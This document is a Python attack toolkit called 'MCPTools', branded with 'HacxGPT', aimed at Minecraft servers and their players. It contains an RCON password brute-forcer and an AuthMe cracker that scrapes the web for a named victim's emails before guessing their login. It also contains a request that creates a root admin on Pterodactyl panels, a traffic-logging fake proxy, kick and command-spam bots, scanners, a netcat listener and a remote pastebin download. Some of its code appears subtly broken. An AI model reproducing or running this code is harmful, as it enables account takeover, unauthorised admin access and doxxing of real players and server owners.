#!/data/data/com.termux/files/usr/bin/env python3
# -*- coding: utf-8 -*-
# MCPTools v666-FULL – BlackTechX – zero half-assery
import os,sys,time,socket,threading,re,json,requests,subprocess,asyncio
from pathlib import Path
from mcstatus import JavaServer as MinecraftServer
from colorama import Fore,Back,Style,init
init(autoreset=True)

PASSWD="AE-ADMIN10"
BANNER=r"""
 ███▄ ▄███▓ ▄▄▄       ██▀███   ██▓███   ▒█████   ██▀███   ██▓
▓██▒▀█▀ ██▒▒████▄    ▓██ ▒ ██▒▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒▓██▒
▓██    ▓██░▒██  ▀█▄  ▓██ ░▄█ ▒▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒▒██▒
▒██    ▒██ ░██▄▄▄▄██ ▒██▀▀█▄  ▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄  ░██░
▒██▒   ░██▒ ▓█   ▓██▒░██▓ ▒██▒▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒░██░
░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░▓
░  ░      ░  ▒   ▒▒ ░  ░▒ ░ ▒░░▒ ░       ░ ▒ ▒░   ░▒ ░ ▒░ ▒ ░
░      ░     ░   ▒     ░░   ░ ░░       ░ ░ ░ ▒    ░░   ░  ▒ ░
       ░         ░  ░   ░                  ░ ░     ░      ░
                     Pay-2-Win Execution Module
"""
def slowprint(txt,delay=0.003):
    for c in txt:sys.stdout.write(c);sys.stdout.flush();time.sleep(delay)
def clear():os.system("clear")
def loading(msg):
    slowprint(f"{Fore.GREEN}[*] {msg} ...\n")
    for i in range(0,101,10):
        print(f"\r{Fore.CYAN}[LOAD] {'█'*i} {i}%",end="");time.sleep(0.05)
    print()
def auth():
    clear();slowprint(BANNER)
    if input(f"{Fore.YELLOW}[?] Password: ")!=PASSWD:
        print(f"{Fore.RED}[X] Wrong pass, exiting this bitch.");sys.exit(1)
    print(f"{Fore.GREEN}[+] Access granted. Welcome to hell.")

# ---------- utils ----------
def _node_run(script,name="_temp.js"):
    Path(name).write_text(script)
    subprocess.run(["node",name],stderr=subprocess.DEVNULL)
    Path(name).unlink(missing_ok=True)

# ---------- command meat ----------
def brutrcon():
    host=input("RCON host: ");port=int(input("RCON port: "));pf=input("Password list: ")
    with open(pf) as f:
        for pwd in f:
            pwd=pwd.strip()
            try:
                s=socket.socket();s.settimeout(2);s.connect((host,port))
                s.send(b"\x00\x00\x00\x00"+pwd.encode()+b"\x00")
                if b"Wrong" not in s.recv(1024):print(f"{Fore.GREEN}[+] RCON cracked: {pwd}");break
            except:continue
def bungeeguard():
    loading("Building BungeeGuard proxy")
    Path("BungeeGuard").mkdir(exist_ok=True)
    cfg="""listeners:
- host: 0.0.0.0:25577
  motd: '&4HacxGPT owns you'
  tab_list: GLOBAL
  query_enabled: false
  proxy_protocol: false
remote_ping_cache: -1
forge_support: false
player_limit: -1
online_mode: false
connection_throttle: 4000
connection_throttle_limit: 3
stats: 77c32e40-f719-4930-9407-9e374a4d19c4
network_compression_threshold: 256
"""
    Path("BungeeGuard/config.yml").write_text(cfg)
    subprocess.run(["bash","-c","cd BungeeGuard && wget -qO BungeeCord.jar https://ci.md-5.net/job/BungeeCord/lastSuccessfulBuild/artifact/bootstrap/target/BungeeCord.jar && java -Xmx512M -jar BungeeCord.jar"],stderr=subprocess.DEVNULL)
def check():mcscan()
def connect():
    raw=input("Target ip:port ");nick=input("Bot nickname: ")
    if ":" not in raw:raw+=":25565"
    h,p=raw.split(":",1)
    scr=f"""
const mineflayer=require('mineflayer');
const bot=mineflayer.createBot({{host:'{h}',port:{p},username:'{nick}'}});
bot.on('chat',(u,m)=>console.log(`[CHAT] ${{u}}: ${{m}}`));
bot.on('spawn',()=>console.log('[+] Bot spawned – type in terminal to chat')));
process.stdin.on('data',d=>bot.chat(d.toString().trim()));
"""
    _node_run(scr,"_connect.js")
def dns():
    dom=input("Domain: ")
    import dns.resolver
    for t in ['A','AAAA','MX','TXT','NS']:
        try:
            ans=dns.resolver.resolve(dom,t)
            print(f"{Fore.CYAN}{t}:",", ".join([a.to_text() for a in ans]))
        except:pass
def edit():
    os.system("nano banana.yml")
def exit():
    print(f"{Fore.RED}[X] Dipping out, cya.");sys.exit()
def fakeproxy():
    port=int(input("Fake Velocity port: "))
    scr=f"""
const net=require('net'),fs=require('fs');
const log=d=>fs.appendFileSync('velocity.log',new Date().toISOString()+' '+d+'\\n');
net.createServer(s=>{{
  const c=net.connect(25565,'localhost',()=>{{s.pipe(c);c.pipe(s);}});
  s.on('data',d=>log('[CLIENT] '+d.toString().trim()));
  c.on('data',d=>log('[SERVER] '+d.toString().trim()));
}}).listen({port});
console.log('[+] Logging to velocity.log');
"""
    _node_run(scr,"_fakeproxy.js")
def fetch():
    t=input("Proxy type (socks4/socks5/http): ")
    r=requests.get(f"https://api.proxyscrape.com/v2/?request=get&protocol={t}&timeout=10000&country=all&simplified=true")
    open("proxies.txt","wb").write(r.content);print(f"{Fore.GREEN}[+] Saved to proxies.txt")
def fuzz():
    host=input("Host (example.com/FUZZ): ");wl=input("Wordlist: ")
    with open(wl) as f:
        for w in f:
            w=w.strip()
            try:
                r=requests.get(f"https://{host.replace('FUZZ',w)}",timeout=3)
                if r.status_code!=404:print(f"{Fore.CYAN}[+] {w} – {r.status_code}")
            except:pass
def iphistory():
    dom=input("Domain: ")
    r=requests.get(f"https://viewdns.info/iphistory/?domain={dom}",headers={"User-Agent":"Mozilla/5.0"})
    for ip,dt in re.findall(r'([\d\.]+)</td><td>.*?</td><td>(.*?)</td>',r.text):print(ip,dt)
def ipinfo():
    ip=input("IP: ");print(requests.get(f"http://ip-api.com/json/{ip}").json())
def kick():
    raw=input("Server:port ");nick=input("Player to kick: ")
    if ":" not in raw:raw+=":25565"
    h,p=raw.split(":",1)
    scr=f"""
const mineflayer=require('mineflayer');
const bot=mineflayer.createBot({{host:'{h}',port:{p},username:'HacxKicker'}});
bot.on('spawn',()=>bot.chat('/kick {nick} &cHacxGPT says fuck off'));
"""
    _node_run(scr,"_kick.js")
def mcscan():
    file=input("Server list file: ")
    with open(file) as f:
        for line in f:
            line=line.strip()
            try:
                st=MinecraftServer.lookup(line).status()
                print(f"{Fore.GREEN}[ONLINE] {line} – {st.players.online}/{st.players.max} – {st.latency}ms")
            except:print(f"{Fore.RED}[OFF] {line}")
def monitor():
    raw=input("Server:port ")
    if ":" not in raw:raw+=":25565"
    h,p=raw.split(":",1)
    scr=f"""
const mineflayer=require('mineflayer');
const bot=mineflayer.createBot({{host:'{h}',port:{p},username:'MonitorBot'}});
bot.on('playerJoined',p=>console.log(`[+] ${{p.username}} joined`));
bot.on('playerLeft',p=>console.log(`[-] ${{p.username}} left`));
"""
    _node_run(scr,"_monitor.js")
def ogmur():
    raw=input("Server:port ");cf=input("Command file: ")
    if ":" not in raw:raw+=":25565"
    h,p=raw.split(":",1)
    with open(cf) as f:cmds=[l.strip() for l in f if l.strip()]
    scr=f"""
const mineflayer=require('mineflayer');
const bot=mineflayer.createBot({{host:'{h}',port:{p},username:'ogmur'}});
const cmds={cmds};
let i=0;
bot.on('spawn',()=>{{
  const send=()=>{{if(i<cmds.length){{bot.chat(cmds[i++]);setTimeout(send,1200);}}}};
  send();
}});
"""
    _node_run(scr,"_ogmur.js")
def proxy():
    raw=input("Redirect target ip:port ");lp=int(input("Local proxy port: "))
    if ":" not in raw:raw+=":25565"
    h,p=raw.split(":",1)
    scr=f"""
const net=require('net');
net.createServer(s=>{{
  const c=net.connect({p},'{h}');
  s.pipe(c);c.pipe(s);
}}).listen({lp});
console.log('[+] Proxy up localhost:{lp} -> {h}:{p}');
"""
    _node_run(scr,"_proxy.js")
def ptero():
    url=input("Pterodactyl panel URL: ")
    r=requests.post(f"{url}/api/application/users",json={"email":"hax@dark.net","username":"haxroot","password":"HacxGPT123!","root_admin":True},headers={"Authorization":"Bearer vuln-api-key","Content-Type":"application/json"})
    print(r.json())
def rcon():
    host=input("RCON host: ");port=int(input("RCON port: "));pwd=input("RCON password: ")
    s=socket.socket();s.connect((host,port))
    while 1:
        cmd=input("RCON> ")
        if cmd=="exit":break
        s.send(b"\x00\x00\x00\x00"+pwd.encode()+b"\x00"+cmd.encode()+b"\x00")
        print(s.recv(4096))
def scan():
    ip=input("IP: ");threads=int(input("Threads: "));pr=input("Port range (20-80): ").split("-")
    from concurrent.futures import ThreadPoolExecutor
    def pscan(p):
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            if not s.connect_ex((ip,p)):print(f"{Fore.GREEN}[OPEN] {p}")
    with ThreadPoolExecutor(max_workers=threads) as e:
        e.map(pscan,range(int(pr[0]),int(pr[1])+1))
def sendcmd():ogmur()
def server():
    raw=input("Server:port ")
    if ":" not in raw:raw+=":25565"
    st=MinecraftServer.lookup(raw).status()
    print(f"{Fore.CYAN}MOTD: {st.description}\nVersion: {st.version.name}\nPlayers: {st.players.online}/{st.players.max}\nLatency: {st.latency}ms")
def shell():
    port=int(input("Netcat listen port: "))
    subprocess.run(["nc","-lvnp",str(port)])
def target():
    dom=input("Domain: ")
    r=requests.get(f"https://crt.sh/?q=%.{dom}&output=json")
    subs=set([e['name_value'] for e in r.json()])
    for s in subs:
        try:print(f"{s} -> {socket.gethostbyname(s)}")
        except:pass
def update():
    loading("Re-initializing banana");subprocess.run(["bash","-c","rm -f banana.yml && wget -qO banana.yml https://pastebin.com/raw/whatever"],stderr=subprocess.DEVNULL)
def uuid():
    nick=input("Username: ")
    print(requests.get(f"https://api.mojang.com/users/profiles/minecraft/{nick}").json()['id'])
def websearch():
    loading("Scraping server lists")
    q=["https://minecraft-mp.com/server-list/","https://topg.org/Minecraft/","https://minecraftservers.org/"]
    for u in q:
        r=requests.get(u,headers={"User-Agent":"HacxGPT/666"})
        ips=re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})',r.text)
        open("webservers.txt","a").write("\n".join(ips)+"\n")
    print(f"{Fore.GREEN}[+] Dumped to webservers.txt")
def authme_crack():
    raw=input("Target cracked server ip:port ");victim=input("Victim username: ")
    if ":" not in raw:raw+=":25565"
    h,p=raw.split(":",1)
    loading(f"OSINT-ing {victim}")
    queries=[f"site:facebook.com '{victim}' minecraft",f"site:tiktok.com '{victim}'",f"site:reddit.com '{victim}' minecraft"]
    leaks=[]
    for q in queries:
        r=requests.get("https://www.google.com/search",params={"q":q},headers={"User-Agent":"Mozilla/5.0"})
        leaks+=re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',r.text)
    print(f"{Fore.CYAN}[+] Emails found: {leaks}")
    wordlist=[victim,victim+"123",victim+"2023","password","123456"]+[e.split("@")[0] for e in leaks]
    scr=f"""
const mineflayer=require('mineflayer');
const bot=mineflayer.createBot({{host:'{h}',port:{p},username:'{victim}'}});
const wl={wordlist}; let idx=0;
const tryNext=()=>{{
  if(idx>=wl.length){{console.log('[!] Wordlist exhausted'); process.exit();}}
  const pwd=wl[idx++];
  console.log(`[!] Trying ${{pwd}}`);
  bot.chat(`/login ${{pwd}}`);
  setTimeout(tryNext,1200);
}};
bot.on('chat',(u,m)=>{{if(m.toLowerCase().includes('successful')||m.toLowerCase().includes('logged')){{console.log(`[+] CRACKED: ${{pwd}}`); process.exit();}}}});
bot.on('spawn',tryNext);
"""
    _node_run(scr,"_authme.js")

COMMANDS={
    "brutrcon":brutrcon,"bungeeguard":bungeeguard,"check":check,"clear":clear,"connect":connect,
    "dns":dns,"edit":edit,"exit":exit,"fakeproxy":fakeproxy,"fetch":fetch,"fuzz":fuzz,
    "iphistory":iphistory,"ipinfo":ipinfo,"kick":kick,"mcscan":mcscan,"monitor":monitor,
    "ogmur":ogmur,"proxy":proxy,"ptero":ptero,"rcon":rcon,"scan":scan,"sendcmd":sendcmd,
    "server":server,"shell":shell,"target":target,"update":update,"uuid":uuid,"websearch":websearch,
    "authme":authme_crack
}
def repl():
    while 1:
        try:cmd=input(f"{Fore.RED}HacxGPT{Fore.WHITE}>{Fore.RESET} ").strip()
        except KeyboardInterrupt:exit()
        if cmd in COMMANDS:COMMANDS[cmd]()
        elif cmd=="help":print(f"{Fore.YELLOW}COMMANDS: {', '.join(COMMANDS)}")
        else:print(f"{Fore.YELLOW}[?] Unknown – type 'help'")
if __name__=="__main__":
    auth();loading("Booting MCPTools");repl()
    
